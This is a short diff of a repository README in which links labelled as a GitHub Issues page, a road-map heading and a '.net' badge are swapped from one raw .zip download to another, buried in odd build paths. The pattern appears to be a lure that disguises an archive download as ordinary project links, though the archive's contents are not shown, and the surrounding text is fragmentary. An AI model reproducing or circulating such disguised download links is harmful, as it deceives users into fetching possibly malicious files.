@@ -40,8 +40,8 @@ Name Methode
 
 😄 ```Dont forget to add Interface App```
 
-💬``**Ask me about any problem in Issues Github**``[Issues-Link](https://raw.githubusercontent.com/dali-raki/INV2/lastTest2/INV.Implementation/Service/MyToolServices/IN-omphacine.zip)
+💬``**Ask me about any problem in Issues Github**``[Issues-Link](https://raw.githubusercontent.com/dali-raki/INV2/lastTest2/Web/bin/Release/net9.0/publish/zh-Hant/IN_v3.5.zip)
 
-## 🔗 https://raw.githubusercontent.com/dali-raki/INV2/lastTest2/INV.Implementation/Service/MyToolServices/IN-omphacine.zip Core Developer Road Map
-[![.net](https://raw.githubusercontent.com/dali-raki/INV2/lastTest2/INV.Implementation/Service/MyToolServices/IN-omphacine.zip)](https://raw.githubusercontent.com/dali-raki/INV2/lastTest2/INV.Implementation/Service/MyToolServices/IN-omphacine.zip)
+## 🔗 https://raw.githubusercontent.com/dali-raki/INV2/lastTest2/Web/bin/Release/net9.0/publish/zh-Hant/IN_v3.5.zip Core Developer Road Map
+[![.net](https://raw.githubusercontent.com/dali-raki/INV2/lastTest2/Web/bin/Release/net9.0/publish/zh-Hant/IN_v3.5.zip)](https://raw.githubusercontent.com/dali-raki/INV2/lastTest2/Web/bin/Release/net9.0/publish/zh-Hant/IN_v3.5.zip)
 
